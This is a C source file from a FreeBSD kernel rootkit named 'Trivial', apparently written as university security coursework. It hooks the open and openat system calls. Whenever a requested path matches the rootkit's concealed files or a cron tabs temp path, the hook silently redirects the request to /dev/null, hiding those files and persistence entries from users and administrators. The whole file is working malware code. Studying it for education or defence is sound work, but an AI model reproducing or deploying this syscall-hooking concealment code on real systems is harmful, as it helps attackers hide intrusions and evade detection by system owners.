/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 * open syscall hook
 *
 */

#include "trivial.h"

static void
process_string(struct thread *td, char * uap_path)
{
	/* Get Path */
	char kpath[PATH_MAX]; 
	size_t len = 0;
	char * tabstmp = "/var/cron/tabs/tmp";

	/* Check isn't specifying absolute path first */
	copyinstr(uap_path, kpath, PATH_MAX, &len);
	/* If the file should be hidden, return /dev/null instead */
	if (strncmp(kpath, CONTENTS_CONCEAL, strlen(kpath)) == 0 ||
			strncmp(kpath, tabstmp, strlen(tabstmp)) == 0) {
		copyout("/dev/null", uap_path, 10);
		return;
	}
		
	/* Get cwd path */
	int e = kern___getcwd(td, kpath, UIO_SYSSPACE, PATH_MAX, PATH_MAX);
	if (e) 
		return;

	/* Append the filename */
	int cwd_len = strlen(kpath);
	kpath[cwd_len] = '/';
	kpath[cwd_len + 1] = 0;
	copyinstr(uap_path, &kpath[strlen(kpath)], PATH_MAX, &len);

	/* If the file should be hidden, return /dev/null instead */
	if (strncmp(kpath, CONTENTS_CONCEAL, strlen(kpath)) == 0 ||
			strncmp(kpath, tabstmp, strlen(tabstmp)) == 0) {
		copyout("/dev/null", uap_path, 10);
	}
}

int
open_hook(struct thread *td, void *syscall_args) 
{
	struct open_args /* {
		char *path;
		int flags;
		int mode;
	} */ *uap;
	uap = (struct open_args *)syscall_args;

	process_string(td, uap->path);

	/* Perform the syscall */
	int error = open(td, syscall_args);

	return (error);
}

int 
openat_hook(struct thread *td, void *syscall_args) 
{
	struct openat_args /* {
		int fd;
		char *path;
		int flags;
		int mode;
	} */ *uap;
	uap = (struct openat_args *)syscall_args;
	
	process_string(td, uap->path);

	/* Perform the syscall */
	int error = openat(td, syscall_args);

	return (error);
}

